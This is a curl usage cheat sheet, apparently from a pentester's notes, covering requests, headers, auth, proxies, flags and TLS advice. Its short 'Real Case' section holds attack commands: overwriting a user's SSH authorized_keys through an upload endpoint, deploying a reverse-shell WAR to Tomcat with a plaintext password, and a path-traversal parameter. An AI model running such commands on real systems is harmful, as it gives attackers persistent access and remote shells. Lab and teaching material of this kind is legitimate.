What is curl?

curl is a command-line tool to transfer data with URLs. It supports HTTP(S), FTP, SFTP and more. You can craft requests, set headers, send JSON/form data, upload/download files, follow redirects, and debug APIs.

  • Great for testing REST/GraphQL endpoints and webhooks
  • Works with headers, cookies, auth tokens, proxies, TLS/SSL, client certs
  • Debug with -v/--trace; prefer secure TLS (avoid -k unless you know the risks)

Real Case

curl -i -L -X POST -F file="@/home/kali/tempo/test.txt" -F filename="/home/alfredo/.ssh/authorized_keys" http://192.168.239.249:33414/file-upload
  • Method : This uses -X POST request.
  • Content-Type : multipart/form-data
curl -u 'tomcat:$3cureP4s5w0rd123!' http://megahosting.htb:8080/manager/text/deploy?path=/rev --upload-file rev.war
  • Method : This uses --upload-file : which is PUT request.
  • Content-Type : application/octet-stream

Double Parameter

curl -G "http://127.0.0.1:8000/backend/" \
  --data-urlencode "view=../../../../../../../var/crash/test.php" \

condition

GET Requests

1) Basic GET

kali@kali:~ $ curl https://api.example.com/status

2) GET with query params & headers

kali@kali:~ $ curl -G "https://api.example.com/search" --data-urlencode "q=red team" --data-urlencode "page=1"
kali@kali:~ $ curl https://api.example.com/items \
  -H "Accept: application/json" -H "Authorization: Bearer <TOKEN>"

3) Follow redirects & save output

kali@kali:~ $ curl -L https://short.url/x -o result.html
kali@kali:~ $ curl -O https://example.com/files/report.pdf   # save with server filename

4) HEAD (metadata only) & range requests

kali@kali:~ $ curl -I https://example.com/large.iso           # headers only
kali@kali:~ $ curl -H "Range: bytes=0-1023" https://example.com/large.iso -o first_kb.bin

POST Requests

1) Form URL-encoded (default for -d)

kali@kali:~ $ curl -X POST https://api.example.com/login \
  -d "username=alice" -d "password=s3cret"
# Content-Type: application/x-www-form-urlencoded (auto-set with -d)

2) JSON body

kali@kali:~ $ curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"name":"Alice","email":"alice@example.com"}'

kali@kali:~ $ curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d @user.json   # read JSON from file

3) Multipart form & file upload

kali@kali:~ $ curl -X POST https://api.example.com/upload \
  -F "file=@/path/to/report.pdf" -F "note=Q3 upload"

4) PUT / PATCH / raw binary

kali@kali:~ $ curl -X PUT https://api.example.com/items/42 -d '{"name":"New"}' \
  -H "Content-Type: application/json"

kali@kali:~ $ curl -X PATCH https://api.example.com/items/42 \
  -H "Content-Type: application/json" -d '{"tags":["hotfix"]}'

kali@kali:~ $ curl --data-binary @binary.bin https://api.example.com/raw

Common Auth, Cookies, Proxies

  • Bearer token: curl -H "Authorization: Bearer <TOKEN>" https://api.example.com/me
  • Basic auth: curl -u user:pass https://api.example.com/private
  • Cookies: curl -b "sid=abc" -c cookies.txt https://example.com
  • Proxy: curl --proxy http://127.0.0.1:8080 https://example.com (SOCKS5: --proxy socks5h://127.0.0.1:9050)

Debugging & TLS

Quick diagnostics

  • -v verbose, -sS silent but show errors, -I HEAD
  • --trace-ascii trace.txt deep request/response trace
  • --http2 force HTTP/2; --resolve example.com:443:1.2.3.4 override DNS
  • --cacert ca.pem custom CA; --cert client.pem --key client.key mTLS
  • -k skips TLS verification (insecure)—avoid unless you fully understand the risk

✅ Useful curl Flags

Flag What it does Example
-k Ignore ssl-certification curl -k -G https://$IP --data-urlencode '...'
-X <METHOD> Set HTTP method (GET/POST/PUT/PATCH/DELETE) curl -X DELETE https://api.example.com/items/42
-d / --data Send form or raw body (URL-encoded by default) curl -d "a=1&b=2" https://ex.com
--data-urlencode URL-encode individual fields safely curl -G --data-urlencode "q=a b" https://ex.com
-H Add header(s) curl -H "Accept: application/json" …
-G Send data as query string (with --data-urlencode) curl -G --data-urlencode "q=test" https://ex.com
-o / -O Write output to file / keep server filename curl -o out.html https://ex.com
-L Follow redirects curl -L https://short.url/x
-u Basic auth (user:pass) curl -u user:pass https://ex.com
-b / -c Send / store cookies curl -b cookie.txt -c new.txt https://ex.com
--retry N Retry transient errors (use with --retry-all-errors) curl --retry 5 --retry-all-errors https://ex.com
--limit-rate Throttle bandwidth curl --limit-rate 500k https://ex.com/file
--proxy Send via HTTP/SOCKS proxy curl --proxy http://127.0.0.1:8080 https://ex.com
-v / --trace Verbose / detailed trace logging curl -v --trace-ascii trace.txt https://ex.com

Security Notes

  • Avoid -k (insecure) unless testing in a controlled env; prefer proper CA trust with --cacert.
  • Quote shells carefully to protect tokens and JSON: use single quotes on *nix, escape where needed on Windows.
  • Be mindful of command history containing secrets (e.g., tokens, passwords). Consider env vars or @files.
  • Validate server identity (hostname, certificate) and use least-privilege API keys.
